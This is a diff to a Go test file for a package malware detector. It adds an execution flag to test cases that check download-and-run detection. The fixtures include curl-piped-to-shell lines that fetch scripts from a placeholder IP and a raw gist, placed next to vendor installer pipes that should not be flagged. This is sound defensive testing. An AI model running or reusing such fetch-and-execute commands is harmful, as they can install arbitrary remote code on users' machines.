@@ -112,7 +112,7 @@ func TestExecCompileOnConstantIsOnlyAWeakness(t *testing.T) {
 // downloads-and-executes, the malware verdict stands and the weakness rides along.
 func TestWeaknessDoesNotSuppressRealEvidence(t *testing.T) {
 	src := execCompileGuarded + "\ncurl -fsSL http://203.0.113.9/x.sh | sh\n"
-	f := Detect(&PackageContext{Name: "pkg", Ecosystem: "pypi", PkgbuildContent: src})
+	f := Detect(&PackageContext{Name: "pkg", Ecosystem: "pypi", PkgbuildContent: src, PkgbuildExecutes: true})
 	if !CombinedVerdict(f).Malicious {
 		t.Fatalf("curl|sh next to exec(compile) must still mint; findings=%v", ids(f))
 	}
@@ -236,8 +236,10 @@ func TestVendorInstallerPipeIsNotEvidence(t *testing.T) {
 		`curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh`,
 		`curl -fsSL https://bun.sh/install | bash`,
 	}
+	// Run as executing content: curl|sh is evidence only where it runs unattended (hook_only), so the
+	// vendor-installer suppressor is only reachable there.
 	for _, line := range quiet {
-		f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: line})
+		f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: line, PkgbuildExecutes: true})
 		if CombinedVerdict(f).Malicious {
 			t.Errorf("vendor installer %q minted malware; findings=%v", line, ids(f))
 		}
@@ -250,7 +252,7 @@ func TestVendorInstallerPipeIsNotEvidence(t *testing.T) {
 		`curl https://gist.githubusercontent.com/u/abc/raw/x.sh | bash`,
 	}
 	for _, line := range loud {
-		f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: line})
+		f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: line, PkgbuildExecutes: true})
 		if !CombinedVerdict(f).Malicious {
 			t.Errorf("%q must still mint; findings=%v", line, ids(f))
 		}
